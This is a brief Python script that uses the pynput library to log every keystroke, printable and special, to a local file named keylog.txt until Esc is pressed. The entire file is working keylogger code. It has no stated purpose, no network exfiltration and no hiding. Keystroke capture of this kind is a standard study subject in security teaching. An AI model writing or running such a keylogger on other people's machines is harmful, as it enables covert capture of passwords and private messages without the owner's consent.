from pynput import keyboard
import os

# Get the current script directory
script_dir = os.path.dirname(__file__)

# Define the log file path
log_file = os.path.join(script_dir, "keylog.txt")

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"Key pressed: {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"Special key pressed: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
